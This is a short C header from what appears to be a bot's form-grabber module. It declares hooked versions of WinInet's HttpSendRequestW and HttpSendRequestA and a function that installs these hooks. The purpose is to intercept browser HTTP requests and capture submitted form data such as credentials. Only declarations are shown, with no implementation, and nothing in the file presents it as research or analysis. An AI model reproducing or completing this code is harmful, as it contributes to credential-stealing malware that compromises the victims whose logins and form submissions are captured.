#pragma once
#include "modules.h"

#ifdef MODULE_FORMGRABBER
#include "bot_structs.h"

BOOL WINAPI HttpSendRequestW_Hooked(HINTERNET hRequest,
	__in_ecount_opt(dwHeadersLength) LPCWSTR lpszHeaders,
	__in DWORD dwHeadersLength,
	__in_bcount_opt(dwOptionalLength) LPVOID lpOptional,
	__in DWORD dwOptionalLength);

BOOL WINAPI HttpSendRequestA_Hooked(_In_ HINTERNET hRequest,
	_In_reads_opt_(dwHeadersLength) LPCSTR lpszHeaders,
	_In_ DWORD dwHeadersLength,
	_In_reads_bytes_opt_(dwOptionalLength) LPVOID lpOptional,
	_In_ DWORD dwOptionalLength);

BOOL WINAPI IsWininet(HMODULE* phMod);
BOOL WINAPI InstallWininetHooks(void);
#endif